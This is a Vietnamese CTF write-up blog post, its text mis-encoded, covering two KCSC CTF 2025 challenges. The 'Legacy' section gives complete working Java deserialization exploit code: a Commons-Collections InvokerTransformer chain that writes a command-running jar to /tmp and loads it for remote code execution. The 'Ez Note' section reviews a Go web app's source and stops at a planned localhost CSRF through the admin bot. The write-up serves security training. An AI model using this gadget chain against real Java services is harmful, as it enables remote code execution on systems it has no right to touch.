---
layout: post
title:  "KCSC CTF 2025"
date:   2025-09-05 10:00:00 +0700
tag: Writeup, KCSC2025
categories: jekyll update
---

# Legacy 

Ban Ä‘áº§u bÃ i nÃ y chá»‰ cho mÃ¬nh má»™t source code viáº¿t báº±ng java. 

CÃ³ class Controller.java lÃ  cÃ³ cÃ¡c endpoint cá»§a á»©ng dá»¥ng. MÃ  quan trá»ng mÃ¬nh tháº¥y nÃ³ cÃ³ dÃ²ng 22 lÃ  `readObject().toString()` cho nÃªn Ä‘Ã¢y cÃ³ thá»ƒ lÃ  má»™t bÃ i java deserialize. 

![image](https://hackmd.io/_uploads/rJsXfY7bll.png)

Quan sÃ¡t tiáº¿p thÃ¬ tháº¥y cÃ³ dÃ¹ng thÆ° viá»‡n `Commons-Collections-3.2.1` vÃ  dÃ¹ng `java-17`

BÃ i nÃ y láº¥y Ã½ tÆ°á»Ÿng nhÆ° má»™t CVE sau: [link](https://cn-sec.com/archives/711453.html)

á»ž JDK17 nÃ y thÃ¬ khÃ´ng thá»ƒ dÃ¹ng sink `TemplateImpl` nÃªn ta exploit thÃ´ng qua sink `InvokerTransformer + ChainedTransformer`, nhÆ° trong Commons-Collections5

Vá»›i Ã½ tÆ°á»Ÿng lÃ  láº¥y output ta sáº½ viáº¿t malicious jar thá»±c thi payload vÃ  quÄƒng output ra ngoÃ i nhÆ° sau: 

```Java=
import java.io.BufferedReader;
import java.io.InputStreamReader;
public class RunCheckConfig {
    public RunCheckConfig(String  args) throws Exception
    {
        Process proc = Runtime.getRuntime().exec(args);
        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        StringBuffer sb = new StringBuffer();
        String line;
        while ((line = br.readLine()) != null)
        {
            sb.append(line).append("\n");
        }
        String result = sb.toString();
        Exception e=new Exception(result);
        throw e;
        }
    }
```

Ta sáº½ compile file láº¡i, rá»“i build láº¡i thÃ nh file jar 
```bash
javac RunCheckConfig.java
jar -cvf RunCheckConfig.jar RunCheckConfig.class
```
Do trong bÃ i Ä‘Ã£ gá»i tá»›i `toString()` nÃªn khÃ´ng cáº§n dÃ¹ng `BadAttributeValueExpException`

Äáº§u tiÃªn ta sáº½ dÃ¹ng `FileOutputStream` Ä‘á»ƒ ghi file jar Ä‘á»™c háº¡i. 

```java=
 Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(java.io.FileOutputStream.class),
                new InvokerTransformer("getConstructor", new Class[] { Class[].class }, new Object[] { new Class[] { String.class } }),
//                new InvokerTransformer("newInstance", new Class[] { Object[].class }, new Object[] { new String[] {"RunCheckConfig.jar"} }),
                new InvokerTransformer("newInstance", new Class[] { Object[].class }, new Object[] { new String[] {"/tmp/RunCheckConfig.jar"} }),
                new InvokerTransformer("write", new Class[] { byte[].class }, new Object[] { classBytes }),
                new ConstantTransformer(1) };
```

Sau khi save file Ä‘á»™c háº¡i lÃªn server sau Ä‘Ã³ dÃ¹ng `URLClassLoader` Ä‘á»ƒ load 

```java=
Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(java.net.URLClassLoader.class),
                new InvokerTransformer("getConstructor", new Class[] { Class[].class }, new Object[] { new Class[] { java.net.URL[].class } }),
//                new InvokerTransformer( "newInstance", new Class[] { Object[].class }, new Object[] { new Object[] { new java.net.URL[] { new java.net.URL( "file:///D:\\Labs\\My_CTF_Chall\\KCSC2025\\java-med\\Legacy\\Legacy\\RunCheckConfig.jar") } } }),
                new InvokerTransformer( "newInstance", new Class[] { Object[].class }, new Object[] { new Object[] { new java.net.URL[] { new java.net.URL( "file:///tmp/RunCheckConfig.jar") } } }),
                new InvokerTransformer("loadClass", new Class[] { String.class }, new Object[] { "RunCheckConfig" }),
                new InvokerTransformer("getConstructor", new Class[] { Class[].class }, new Object[] { new Class[] { String.class } }),
                new InvokerTransformer("newInstance", new Class[] { Object[].class }, new Object[] { new String[] { cmd } }),
                new ConstantTransformer(1) };
```

TÃ³m láº¡i ta cÃ³ thá»ƒ code Exploit nhÆ° sau: 

```java=
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.net.MalformedURLException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Exploit {

    public static byte[] setupPayload() throws IOException {
        byte[] classBytes = genBytesContent();

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(java.io.FileOutputStream.class),
                new InvokerTransformer("getConstructor", new Class[] { Class[].class }, new Object[] { new Class[] { String.class } }),
//                new InvokerTransformer("newInstance", new Class[] { Object[].class }, new Object[] { new String[] {"RunCheckConfig.jar"} }),
                new InvokerTransformer("newInstance", new Class[] { Object[].class }, new Object[] { new String[] {"/tmp/RunCheckConfig.jar"} }),
                new InvokerTransformer("write", new Class[] { byte[].class }, new Object[] { classBytes }),
                new ConstantTransformer(1) };
        ChainedTransformer chain = new ChainedTransformer(transformers);

        Map lazyMap = (Map) LazyMap.decorate(new HashMap(), chain);
        TiedMapEntry tied = new TiedMapEntry(lazyMap, 1);

        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(tied);
            oos.close();
            return bos.toByteArray();
        } catch (IOException e) { throw new RuntimeException(e); }
    }

    // javac RunCheckConfig.java
    // jar -cvf RunCheckConfig.jar RunCheckConfig.class
    public static byte[] genBytesContent() throws IOException {
        String classFilePath = "RunCheckConfig.jar";
        return Files.readAllBytes(Paths.get(classFilePath));
    }

    public static byte[] rcePayload(String cmd) throws MalformedURLException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(java.net.URLClassLoader.class),
                new InvokerTransformer("getConstructor", new Class[] { Class[].class }, new Object[] { new Class[] { java.net.URL[].class } }),
//                new InvokerTransformer( "newInstance", new Class[] { Object[].class }, new Object[] { new Object[] { new java.net.URL[] { new java.net.URL( "file:///D:\\Labs\\My_CTF_Chall\\KCSC2025\\java-med\\Legacy\\Legacy\\RunCheckConfig.jar") } } }),
                new InvokerTransformer( "newInstance", new Class[] { Object[].class }, new Object[] { new Object[] { new java.net.URL[] { new java.net.URL( "file:///tmp/RunCheckConfig.jar") } } }),
                new InvokerTransformer("loadClass", new Class[] { String.class }, new Object[] { "RunCheckConfig" }),
                new InvokerTransformer("getConstructor", new Class[] { Class[].class }, new Object[] { new Class[] { String.class } }),
                new InvokerTransformer("newInstance", new Class[] { Object[].class }, new Object[] { new String[] { cmd } }),
                new ConstantTransformer(1) };

        ChainedTransformer chain = new ChainedTransformer(transformers);
        Map lazyMap = (Map) LazyMap.decorate(new HashMap(), chain);
        TiedMapEntry tied = new TiedMapEntry(lazyMap, 1);

        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(tied);
            oos.close();
            return bos.toByteArray();
        } catch (IOException e) { throw new RuntimeException(e);}
    }

    public static void main(String[] args) throws IOException {
        byte[] setupPayload = setupPayload();
        System.out.println("Setup Payload");
        System.out.println(Base64.getEncoder().encodeToString(setupPayload));

        byte[] payload = rcePayload("id");
        System.out.println("Payload");
        System.out.println(Base64.getEncoder().encodeToString(payload));
    }
}
```

* Káº¿t quáº£: 

BÆ°á»›c 1 viáº¿t file malicious jar 

![image](https://hackmd.io/_uploads/rJa2FYQWgx.png)

BÆ°á»›c 2 trigger file malicious jar ra output 

![image](https://hackmd.io/_uploads/Hytvct7Zeg.png)

# Ez Note 

## Giao diá»‡n web 

![image](https://hackmd.io/_uploads/BJFK0rS9ex.png)

MÃ¬nh sáº½ pháº£i register 1 tÃ i khoáº£n há»£p lá»‡ 

![image](https://hackmd.io/_uploads/HJvw0BS9el.png)

Sau khi login vÃ o thÃ¬ mÃ¬nh Ä‘Æ°á»£c chuyá»ƒn Ä‘áº¿n trang dashboard chá»©a nhá»¯ng bÃ i post. 

![image](https://hackmd.io/_uploads/HJosRrB9eg.png)

á»ž Ä‘Ã¢y mÃ¬nh cÃ³ thá»ƒ táº¡o 1 bÃ i post. 

![image](https://hackmd.io/_uploads/rJV0ABBqlx.png)

Khi táº¡o bÃ i thÃ¬ mÃ¬nh Ä‘Æ°á»£c quyá»n Ä‘á»ƒ cháº¿ Ä‘á»™ bÃ i post nÃ y á»Ÿ cháº¿ Ä‘á»™ `public` hoáº·c `private`.

![image](https://hackmd.io/_uploads/Skr-xIr5el.png)

VÃ  khi truy cáº­p vÃ o 1 bÃ i post, mÃ¬nh sáº½ cÃ³ 1 chá»©c nÄƒng lÃ  táº¡o ra 1 `access-code` dÃ¹ng Ä‘á»ƒ chá»‰ Ä‘á»‹nh cho ngÆ°á»i dÃ¹ng khÃ¡c mÃºn truy cáº­p vÃ o bÃ i viáº¿t cá»§a mÃ¬nh thÃ¬ pháº£i cung cáº¥p Ä‘Ãºng `access-code` nÃ y. 

![image](https://hackmd.io/_uploads/ByXUxLrcxl.png)

![image](https://hackmd.io/_uploads/B1JRxUSqge.png)

## Review Source Code 

![image](https://hackmd.io/_uploads/ryCX18rclg.png)

ÄÃ¢y lÃ  toÃ n bá»™ source code cá»§a challenge nÃ y. 

### File `routes.go`
MÃ¬nh sáº½ báº¯t Ä‘áº§u Ä‘i tá»« file `routes.go` nhÃ³e !! 

![image](https://hackmd.io/_uploads/Hk-of8Bcxg.png)

á»ž Ä‘Ã¢y, tÃ¬m tháº¥y Ä‘Æ°á»£c `route` á»Ÿ á»©ng dá»¥ng web nÃ y. 
- `/login`
- `/register`
ÄÆ°á»£c báº£o vá»‡ trong `AuthMiddleware`:
- `GET /posts`
- `GET /post/new`
- `GET /report`
- `GET /post/:id`
- `GET /logout`
ÄÆ°á»£c báº£o vá»‡ trong `CsrfMiddleware`:
- `POST /report`
- `POST /post`
- `POST /post/:id/access-code`

TrÆ°á»›c háº¿t, mÃ¬nh sáº½ Ä‘i qua cÃ¡c nhÃ³m khÃ´ng Ä‘Æ°á»£c báº£o vá»‡ lÃ  `login` vÃ  `register`

### NhÃ³m ko Ä‘Æ°á»£c báº£o vá»‡ `public` 

![image](https://hackmd.io/_uploads/SyGHmjLcxg.png)

Khi user truy cáº­p `/` thÃ¬ nÃ³ sáº½ gá»i `controller.Index` lÃ  file `index_controller.go` táº¡i folder `controller`

Rá»“i tiáº¿p tá»¥c redirect vá» `/login`. VÃ  `/login` thÃ¬ gá»i tá»›i `LoginIndex` Ä‘á»ƒ render ra template `login`.

![image](https://hackmd.io/_uploads/BkRvKUHqle.png)

TÆ°Æ¡ng tá»± khi truy cáº­p vá»›i `register` cÅ©ng render ra template.

Khi user truy cáº­p vá»›i cÃ¡c endpoint `login` vÃ  `register` vá»›i method POST thÃ¬ nÃ³ sáº½ gá»i tá»›i `LoginHandler` vÃ  `RegisterHandler` cá»§a file `auth_controller.go` táº¡i folder `controller`

Vá»›i `POST /register` nhÆ° sau:

![image](https://hackmd.io/_uploads/rJ2nW58qxl.png)

á»ž Ä‘Ã¢y, nÃ³ thá»±c hiá»‡n láº¥y dá»¯ liá»‡u tá»« form náº¿u khÃ´ng Ä‘Ãºng thÃ¬ sáº½ render láº¡i template `register.html` vÃ  in ra `Invalid input`. VÃ  náº¿u há»£p lÃ­ thÃ¬ nÃ³ sáº½ gá»i tá»›i `services.RegisterUser` táº¡i `services/auth_service.go`

![image](https://hackmd.io/_uploads/r1ePLGqIqll.png)

HÃ m nÃ y sáº½ thá»±c hiá»‡n gá»i Ä‘áº¿n `models.User` Ä‘Æ°á»£c Ä‘á»‹nh sáºµn cáº¥u trÃºc. Sau Ä‘Ã³, nÃ³ gÃ¡n vÃ o trong `Username` vÃ  thá»±c hiá»‡n Hash password. VÃ  tráº£ vá» káº¿t quáº£ táº¡o 1 báº£ng `user` trong DB. 

ÄÃ¢y lÃ  file `user.go` trong `models` Ä‘Æ°á»£c gá»i tá»›i. 

![image](https://hackmd.io/_uploads/ryhTI9U9eg.png)

Äáº¿n vá»›i pháº§n xá»­ `POST /login` trong file `auth_controller.go`

![image](https://hackmd.io/_uploads/SkgEP9Icxl.png)

Khi `login` thÃ¬ nÃ³ sáº½ gá»i tá»›i `services.LoginUser` vÃ `services.CreateAuthWithCSRF` Ä‘Æ°á»£c xá»­ lÃ½ táº¡i `services/auth_service.go`

![image](https://hackmd.io/_uploads/B15f_q8cxe.png)

Khi Ä‘Ã³ nÃ³ sáº½ thá»±c hiá»‡n query trong DB dá»±a vÃ o `username` vÃ  gá»i `models.User` Ä‘á»ƒ gá»i hÃ m `CheckPassword`

Sau Ä‘Ã³, gá»i tá»›i hÃ m `CreateAuthWithCSRF` thÃ¬ trong nÃ y sáº½ táº¡o ra `csrfToken` dá»±a vÃ o hÃ m `GenerateCSRFToken()` náº±m á»Ÿ cuá»‘i. 

![image](https://hackmd.io/_uploads/rkTNFqUqle.png)

HÃ m nÃ y sáº½ thá»±c hiá»‡n sinh ra 1 `csrf token` 32 byte ngáº«u nhiÃªn, sau Ä‘Ã³ tráº£ vá» báº±ng cÃ¡ch encode base64. 

Cuá»‘i cÃ¹ng, nÃ³ táº¡o 1 `token` dá»±a vÃ o `username`, `userID` vÃ  `csrfToken` gá»i tá»›i hÃ m `GenerateJWTWithCSRF` 

![image](https://hackmd.io/_uploads/HkqNcq8qll.png)

Khi táº¡o 1 JWT thÃ¬ nÃ³ sáº½ kÃ¨m vá»›i trÆ°á»ng `expirationTime` lÃ  thá»i gian háº¿t háº¡n, token nÃ y sá»‘ng Ä‘Æ°á»£c 24h. VÃ  JWT nÃ y dÃ¹ng thuáº­t toÃ¡n HS256 vÃ  kÃ½ báº±ng `jwtKey` Ä‘Æ°á»£c sinh ra tá»« biáº¿n mÃ´i trÆ°á»ng cá»§a há»‡ thá»‘ng. 

![image](https://hackmd.io/_uploads/S1easqLqxl.png)

NhÆ° váº­y tÃ³m táº¯t láº¡i Ä‘Æ°á»£c lÆ°u trong Cookie sáº½ cÃ³: 
- `csrfToken` -> 1 giá»
- `token` lÃ  JWT vÃ  chá»©a `csrfToken` bÃªn trong -> 24 giá» 

![image](https://hackmd.io/_uploads/BkRAn9Icge.png)


### NhÃ³m Ä‘Æ°á»£c báº£o vá»‡ bá»Ÿi `AuthMiddleWare`

![image](https://hackmd.io/_uploads/H1rg4s8qge.png)

á»ž nhÃ³m nÃ y khi ngÆ°á»i dÃ¹ng muá»‘n truy cáº­p vÃ o cÃ¡c route kia thÃ¬ pháº£i Ä‘i qua 1 bÆ°á»›c xÃ¡c thá»±c. 

MÃ¬nh sáº½ tÃ¬m hiá»ƒu qua file `auth_middleware.go` táº¡i folder `middle`. 

### File `auth_middleware`

![image](https://hackmd.io/_uploads/Hy4VLsUqel.png)

á»ž Ä‘Ã¢y, nÃ³ sáº½ thá»±c hiá»‡n láº¥y `userID` Ä‘Æ°á»£c lÆ°u trong DB. Äá»ƒ kiá»ƒm tra xem user nÃ y Ä‘Ã£ Ä‘Æ°á»£c xÃ¡c thá»±c chÆ°a náº¿u rá»“i thÃ¬ Ä‘i qua bÆ°á»›c tiáº¿p theo. 

Náº¿u chÆ°a thÃ¬ nÃ³ sáº½ láº¥y token vÃ  khÃ´ng cÃ³ token thÃ¬ thá»±c hiá»‡n xem xÃ©t náº¿u lÃ  request tá»« `127.0.0.1` hay `::1` thÃ¬ thá»±c hiá»‡n táº¡o `csrfToken` vá»›i `username` lÃ  `admin` vÃ  `userID` lÃ  `1` náº¿u ko cÃ³ lá»—i gÃ¬ xáº£y ra thÃ¬ gÃ¡n vÃ o Cookie `token` vÃ  `csrf_token`, `username` lÃ  `admin` vÃ  `userId` lÃ  `1`. 

CÃ²n náº¿u ko pháº£i request tá»« `localhost` thÃ¬ nÃ³ sáº½ gá»i tá»›i hÃ m `services.ValidateToken` táº¡i  `services/auth_service.go`

![image](https://hackmd.io/_uploads/H1uBioLqll.png)

HÃ m nÃ y sáº½ phÃ¢n tÃ­ch kiá»ƒm tra token cÃ³ tÃ­nh há»£p lá»‡ hay ko. 
Náº¿u há»£p lá»‡ thÃ¬ sau cÅ©ng nÃ³ sáº½ set `username` vÃ  `userID` láº¥y tá»« `token`.

![image](https://hackmd.io/_uploads/S19W3s8clx.png)

TÃ³m láº¡i sáº½ xÃ¡c thá»±c trÆ°á»›c khi Ä‘i vÃ o cÃ¡c routes 
- Náº¿u ko cÃ³ token mÃ  request Ä‘áº¿n tá»« local sáº½ Ä‘Æ°á»£c set admin
- Náº¿u á»•n thÃ¬ cho qua 

Má»¥c tiÃªu lÃ  pháº£i `login` rá»“i Ä‘Æ°á»£c truy cáº­p.

Khi user gá»i Ä‘áº¿n route `/posts` thÃ¬ nÃ³ sáº½ gá»i tá»›i hÃ m `GetPostHandler` táº¡i `controller/post_controller.go`

![image](https://hackmd.io/_uploads/r1Ix6o8qgx.png)

HÃ m nÃ y sáº½ thá»±c hiá»‡n láº¥y `userID` trong DB, sau Ä‘Ã³ gá»i tá»›i hÃ m `services.GetUserPosts` táº¡i `services/post_service.go`

![image](https://hackmd.io/_uploads/BkhPaoUqee.png)

á»ž Ä‘Ã¢y sáº½ query láº¥y táº¥t cáº£ bÃ i post dá»±a trÃªn `userID`. 

Tiáº¿p theo khi user truy cáº­p `/post/new` thÃ¬ nÃ³ sáº½ gá»i `PostNewIndex` táº¡i `controller/post_controller.go` má»¥c Ä‘Ã­ch lÃ  render ra template. 

![image](https://hackmd.io/_uploads/BkgkMCsI5ee.png)

Khi user truy cáº­p route `/post/:id` thÃ¬ nÃ³ sáº½ gá»i `GetPostHandler` táº¡i `controller/post_controller.go` 

![image](https://hackmd.io/_uploads/HkVi12I9le.png)

HÃ m nÃ y sáº½ thá»±c hiá»‡n kiá»ƒm tra qua tham sá»‘ `id` náº¿u há»£p lá»‡ thÃ¬ gá»i hÃ m `services.GetPostByID` táº¡i `services/post_service.go` Ä‘á»ƒ thá»±c hiá»‡n query dá»±a vÃ o `id`. 

![image](https://hackmd.io/_uploads/Sk_Hb3Iqxl.png)

HÃ m nÃ y sáº½ thá»±c hiá»‡n káº¿t ná»‘i tá»i DB Ä‘á»ƒ query ra cÃ¡c thÃ´ng tin bÃ i post dá»±a vÃ o `postID`. 

Khi user truy cáº­p vÃ o `/logout` thÃ¬ nÃ³ sáº½ gá»i `LogoutHandler` táº¡i `controller/auth_controller.go`

![image](https://hackmd.io/_uploads/HyKfT9Lqel.png)

HÃ m nÃ y Ä‘Æ¡n giáº£n chá»‰ Ä‘á»ƒ xÃ³a Ä‘i `csrfToken` rá»“i chuyá»ƒn hÆ°á»›ng Ä‘áº¿n `/login`

Khi user truy cáº­p `/report` sáº½ gá»i tá»›i `ReportIndex` táº¡i `controller/report_controller.go` 

![image](https://hackmd.io/_uploads/BJE9Vn8qgg.png)

Thá»±c hiá»‡n render ra template. 

### NhÃ³m Ä‘Æ°á»£c báº£o vá» bá»Ÿi `CsrfMiddleware`

![image](https://hackmd.io/_uploads/Byy3BhI5le.png)

Theo nhÆ° trÃªn thÃ¬ cÃ¡c nhÃ³m `/api` Ä‘Æ°á»£c báº£o vá»‡ chá»‰ cÃ³ bá»Ÿi `CsrfMiddleware`, nhÆ°ng quan sÃ¡t ká»¹ thÃ¬ tháº¥y `/api` Ä‘Æ°á»£c gÃ¡n thÃªm `protected` cho nÃªn nÃ³ bao gá»“m `AuthMiddleware` + `CsrfMiddleware` 

MÃ¬nh sáº½ phÃ¢n tÃ­ch file `CsrfMiddleware` xem nÃ³ hoáº¡t Ä‘á»™ng nhÆ° tháº¿ nÃ o nha. 

### File `csrf_middleware.go`

![image](https://hackmd.io/_uploads/B1WYd3Icxe.png)

![image](https://hackmd.io/_uploads/ryki_nL5el.png)

Äáº§u tiÃªn nÃ³ sáº½ kiá»ƒm tra ráº±ng náº¿u method lÃ  `OPTIONS` thÃ¬ nÃ³ cháº·n. 

Tiáº¿p theo lÃ  request lÃ  mÃ  cÃ³ `Content-Type` lÃ  rá»—ng thÃ¬ bá» qua. NghÄ©a lÃ  chá»‰ check Csrf vá»›i `POST, PUT, DELTE`.

Sau Ä‘Ã³, láº¥y trÆ°á»ng `token` trong Cookie náº¿u ko cÃ³ thÃ¬ hiá»ƒn thá»‹ `Authentication required`. 

VÃ  náº¿u ko lá»—i thÃ¬ gá»i tá»›i `services.ValidateToken` Ä‘á»ƒ phÃ¢n tÃ­ch xem token gá»­i lÃªn cÃ³ há»£p lá»‡ ko. Náº¿u há»£p lá»‡ thÃ¬ láº¥y trÆ°á»ng `X-CSRF-Token` trong header.

á»ž Ä‘Ã¢y thÃ¬ cÃ³ 1 tháº¯c máº¯c lÃ  táº¡i sao lÃ²i ra `X-CSRF-Token` ná»¯a. ThÃ¬ khi quan sÃ¡t trong cÃ¡c template. 

![image](https://hackmd.io/_uploads/SyE9clw5xx.png)

NghÄ©a lÃ  trong template á»Ÿ pháº§n javascript sáº½ Ä‘áº£m nháº­n cÃ¡c pháº§n fetch tá»›i cÃ¡c `api` thÃ¬ sáº½ gá»­i kÃ¨m thÃªm header `X-CSRF-Token` 

VÃ  náº¿u `csrfToken` báº±ng rá»—ng thÃ¬ hiá»ƒn thá»‹ thÃ´ng bÃ¡o, khi Ä‘Ã³ nÃ³ sáº½ gá»i `ValidateCSRFToken` náº¿u cÃ³ lá»—i thÃ¬ sáº½ in ra. 

![image](https://hackmd.io/_uploads/HJWFZ7v9el.png)

HÃ m nÃ£y sáº½ decode ra rá»“i so sÃ¡nh xem cÃ³ báº±ng vá»›i `crsftoken` lÆ°u trong `token` hay ko, náº¿u cÃ³ thÃ¬ há»£p lá»‡.

TÃ³m láº¡i file `csrf_middleware.go` sáº½ Ä‘áº£m báº£o khi gá»i tá»›i cÃ¡c `/api` thÃ¬ user pháº£i á»Ÿ tráº¡ng Ä‘Ã£ xÃ¡c thá»±c `login` báº±ng `auth_middleware` vÃ  `csrf_middleware`.

Khi user gá»­i `POST /post` thÃ¬ nÃ³ sáº½ gá»i tá»›i `CreatePostHandler` cá»§a file `post_controller.go` táº¡i `controller/post_controller.go`

![image](https://hackmd.io/_uploads/Bkn2whLqgl.png)

NÃ³ sáº½ gÃ¡n cÃ¡c trÆ°á»ng `Title`, `Content` lÃ  String cÃ²n `IsPrivate` lÃ  bool vÃ  máº·c Ä‘á»‹nh nÃ³ lÃ  `false`. 

Khi Ä‘Ã³ sáº½ gá»i tá»›i hÃ m `services.CreatePost` táº¡i `services/post_service.go` 

![image](https://hackmd.io/_uploads/BJwuuzv5el.png)

NÃ³ sáº½ táº¡o vÃ  lÆ°u dá»±a vÃ o `models.Post`, sau Ä‘Ã³ nÃ³ lÆ°u vÃ o trong DB. 

![image](https://hackmd.io/_uploads/B15DRzwqee.png)

á»ž Ä‘Ã¢y thÃ¬ Ä‘á»‹nh nghÄ©a ra cáº¥u trÃºc cá»§a bÃ i Post gá»“m `Title`, `Content` lÃ  String,... vÃ  `AccessCode` lÃ  String, cÃºi cÃ¹ng lÃ  `Accesses` lÃ  1 máº£ng `Access`. VÃ  máº£ng `Access` cÅ©ng Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a phÃ­a dÆ°á»›i. LÃ  gá»“m cÃ¡c trÆ°á»ng `Username`, `AccessCode` lÃ  String vÃ  náº¿u ko cÃ³ thÃ¬ máº·c Ä‘á»‹nh nÃ³ lÃ  `1337`. 

Khi user gá»i `/api/post/:id/access-code`, thÃ¬ nÃ³ sáº½ gá»i `GenerateAccessCodeHandler` táº¡i `controller/post_controller.go` 

![image](https://hackmd.io/_uploads/HJh3tzv9gx.png)

![image](https://hackmd.io/_uploads/S1klqMPqge.png)

Äáº§u tiÃªn, nÃ³ sáº½ láº¥y tham sá»‘ `id` vÃ  náº¿u ko há»£p lá»‡ thÃ¬ in ra lá»—i. VÃ  náº¿u há»£p lá»‡ thÃ¬ nÃ³ sáº½ láº¥y bÃ i post dá»±a vÃ o `services.GetPostByID` táº¡i `services/post_services.go`.
Äá»ƒ cÃ³ thá»ƒ láº¥y bÃ i post dá»±a vÃ o Ä‘Ãºng `id` Ä‘Ã£ cung cáº¥p. 

Sau Ä‘Ã³, nÃ³ sáº½ láº¥y `UserID` Ä‘Ã£ Ä‘Æ°á»£c xÃ¡c thá»±c tá»« `auth_middleware.go` trÆ°á»›c Ä‘Ã³. VÃ  so sÃ¡nh vá»›i `UserID` cá»§a bÃ i post náº¿u ko trÃ¹ng thÃ¬ in ra `You dont own this post`. 

Tiáº¿p Ä‘Ã³, thÃ¬ nÃ³ tiáº¿p cÃ¡c trÆ°á»ng `ValidHours`, `CustomCode` (max chá»‰ cÃ³ 10 kÃ­ tá»±) vÃ  `Username`. ThÃ¬ nhá»¯ng trong JS nÃ³ sáº½ Ä‘Æ°á»£c map vÃ o trong struct nÃ y. 

VÃ  tiáº¿p tá»¥c, gá»i tá»›i `services.GetUserByUsername` táº¡i `services/post_services.go`. NÃ³ sáº½ kiá»ƒm tra xem cÃ³ `username` Ä‘Ã³ ko, náº¿u ko cÃ³ thÃ¬ in ra `Invalid username`.
Náº¿u cÃ³ `username` thÃ¬ tiáº¿p tá»¥c gá»i tá»›i `services.GenerateUserSpecificAccessCode` táº¡i `services/post_services.go` 

![image](https://hackmd.io/_uploads/B1ryCzwcle.png)

Äáº§u tiÃªn, nÃ³ sáº½ táº¡o láº¥y dá»±a vÃ o `models.Access` cÃ¡c trÆ°á»ng `PostID`, `ExpiresAt` vÃ  `Username`. Sau Ä‘Ã³, gá»i tá»›i DB Ä‘á»ƒ táº¡o `access`. 

Tiáº¿p Ä‘Ã³, nÃ³ sinh ra 12 byte ngáº«u nhiÃªn. Sau Ä‘Ã³, `accessCode` thÃ¬ nÃ³ Ä‘Æ°á»£c táº¡o ra tá»« `customCode` ná»‘i vá»›i 1 chuá»—i 16 kÃ½ tá»± Ä‘Ã£ encode Base64. Rá»“i láº¡i gá»i tá»›i DB Ä‘á»ƒ lÆ°u `accessCode` nÃ y (update). 

Khi user gá»i tá»›i `POST /report` thÃ¬ nÃ³ gá»i `ReportHandler` cá»§a file `report_controller.go` táº¡i `controller/report_controller.go` 

![image](https://hackmd.io/_uploads/H1gxX7D9lg.png)

HÃ m nÃ y sáº½ thá»±c hiá»‡n nháº­n 1 vÃ o URL qua tham sá»‘ `url`, sau Ä‘Ã³ thá»±c hiá»‡n `exec.Commad` nghÄ©a lÃ  lá»‡nh tá»« OS. Cháº¡y file `/app/bot/bot.js`. Sau Ä‘Ã³, tráº£ vá» tráº¡ng thÃ¡i theo dáº¡ng JSON.

MÃ¬nh sáº½ tÃ¬m hiá»ƒu file `/app/bot/bot.js` 

![image](https://hackmd.io/_uploads/ByLZ4Xvcel.png)

![image](https://hackmd.io/_uploads/BymmE7wqxx.png)

MÃ¬nh sáº½ mÃ´ táº£ lá»‡nh bot khi cháº¡y `node /app/bot/bot.js http://test.abc` cho nÃªn nÃ³ sáº½ láº¥y `url` qua `const targetUrl = process.argv[2]`. 

Tiáº¿p theo, set cÃ¡c biáº¿n mÃ´i trÆ°á»ng `username` lÃ  `admin`, `password` lÃ  biáº¿n mÃ´i trÆ°á»ng. 

Sau Ä‘Ã³, nÃ³ má»Ÿ 1 trÃ¬nh duyá»‡t dÆ°á»›i dáº¡ng `handless` lÃ  cháº¡y ngáº§m. 

Bot nÃ³ sáº½ má»Ÿ 1 trang má»›i, truy cáº­p Ä‘áº¿n url Ä‘Ã£ cung cáº¥p. Sau Ä‘Ã³

Äáº¿n vá»›i file cuá»‘i cÃ¹ng lÃ  `main.go`

![image](https://hackmd.io/_uploads/HJ8ovXDcle.png)

![image](https://hackmd.io/_uploads/r1d1Omwcgl.png)

Má»¥c tiÃªu cá»§a file nÃ y lÃ  sáº½ táº¡o ra 1 tÃ i khoáº£n `admin` vÃ  password Ä‘Æ°á»£c láº¥y tá»« biáº¿n mÃ´i trÆ°á»ng.

Sau Ä‘Ã³, nÃ³ táº¡o `flagpost` chá»‰ thuá»™c vá» username `admin` vÃ¬ `UserID: adminUser.ID` vá»›i ná»™i dung cá»§a flag Ä‘Æ°á»£c set trong biáº¿n mÃ´i trÆ°á»ng. NhÆ° váº­y bÃ i post nÃ y Ä‘Æ°á»£c táº¡o thÃ¬ `id` nÃ³ lÃ  1. 

## Flow khai thÃ¡c 

1. Quan sÃ¡t á»©ng dá»¥ng 
- CÃ³ sáºµn user `admin` vÃ  má»™t bÃ i viáº¿t (id=1) chá»©a flag, gáº¯n vá»›i admin, Ä‘áº·t á»Ÿ cháº¿ Ä‘á»™ private

![image](https://hackmd.io/_uploads/Hk3BcJuqgg.png)

- Muá»‘n xem Ä‘Æ°á»£c post nÃ y cáº§n thá»a 2 Ä‘iá»u kiá»‡n: 
    - `UserID` khá»›p vá»›i `admin`
    - cÃ³ má»™t access code há»£p lá»‡ do admin cáº¥p 

2. PhÃ¢n tÃ­ch bot 
- Há»‡ thá»‘ng cÃ³ endpoint `/api/report?url=...` Ä‘á»ƒ gá»­i link cho bot 
- Bot cháº¡y Chromium handless vÃ  nháº¥p vÃ o link Ä‘Æ°á»£c gá»­i 
- Bot ko login báº±ng admin (ko cÃ³ code nÃ o login trong `bot.js`)
- NhÆ°ng bot cháº¡y mÃ´i trÆ°á»ng cÃ¹ng local network vá»›i (cÃ³ thá»ƒ gá»­i request Ä‘áº¿n 127.0.0.1:19101)

3. Ã tÆ°á»Ÿng táº¥n cÃ´ng 
- Lá»£i dá»¥ng bot Ä‘á»ƒ thá»±c hiá»‡n `CSRF tá»« localhost`
